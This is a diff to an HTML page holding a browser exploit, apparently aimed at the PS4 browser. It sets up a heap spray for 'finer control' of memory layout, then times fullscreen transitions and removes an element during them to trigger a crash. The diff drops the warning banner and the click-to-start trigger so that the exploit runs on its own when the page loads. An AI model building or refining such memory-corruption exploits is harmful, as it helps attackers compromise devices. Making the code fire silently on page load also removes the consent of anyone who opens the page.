@@ -10,65 +10,51 @@
       position: absolute; 
       left: 0; top: 50%; 
     }
-    #status { 
-      font-family: Arial; 
-      color: white; 
-      background: black; 
-      padding: 10px; 
-      position: fixed; 
-      top: 0; 
-      left: 0; 
-      z-index: 9999; 
-    }
   </style>
 </head>
 <body style="background: #000; height: 200vh;">
   <div id="box"></div>
-  <div id="status">CLICK TO START | AUTO-CRASH IN 3 SECONDS</div>
-
   <script>
     const box = document.getElementById('box');
-    const status = document.getElementById('status');
 
-    // Heap spray to increase memory pressure
+    // Heap spray to control memory layout
     function heapSpray() {
       window.spray = [];
-      for (let i = 0; i < 500; i++) {
-        window.spray.push(new ArrayBuffer(0x10000));
+      for (let i = 0; i < 1000; i++) {
+        window.spray.push(new ArrayBuffer(0x1000)); // Smaller chunks for finer control
       }
-    }
-
-    // Force full-screen (may fail due to browser restrictions)
-    function tryFullscreen() {
-      document.documentElement.requestFullscreen().catch(e => {
-        status.textContent = "FULLSCREEN FAILED (DO IT MANUALLY)";
-      });
     }
 
     // Main exploit
     function triggerExploit() {
       heapSpray();
-      status.textContent = "CRASHING IN 3 SECONDS...";
-
+      
       // Start transition loop
       setInterval(() => {
         box.style.transform = 'translateX(0)';
         setTimeout(() => box.style.transform = 'translateX(300px)', 10);
       }, 1000);
 
-      // Schedule crash
+      // Enter full-screen after a delay
       setTimeout(() => {
-        tryFullscreen(); // Attempt automated fullscreen
-        setTimeout(() => {
-          box.remove();
-          document.body.offsetHeight; // Force reflow
-          status.textContent = "CRASHING NOW! (EXIT FULLSCREEN)";
-        }, 500); // Short delay before reflow
-      }, 3000); // 3-second countdown
+        document.documentElement.requestFullscreen()
+          .then(() => {
+            // Exit full-screen immediately (critical timing!)
+            setTimeout(() => {
+              document.exitFullscreen(); 
+              // Trigger crash during transition
+              setTimeout(() => {
+                box.remove();
+                document.body.offsetHeight; // Force reflow
+              }, 50); // Adjust this delay for precision
+            }, 100); // Exit full-screen delay
+          })
+          .catch(e => console.error("Fullscreen failed:", e));
+      }, 2000); // Initial delay before full-screen
     }
 
-    // Start on click
-    document.body.addEventListener('click', triggerExploit);
+    // Start automatically (if PS4 browser allows)
+    setTimeout(triggerExploit, 1000);
   </script>
 </body>
 </html>
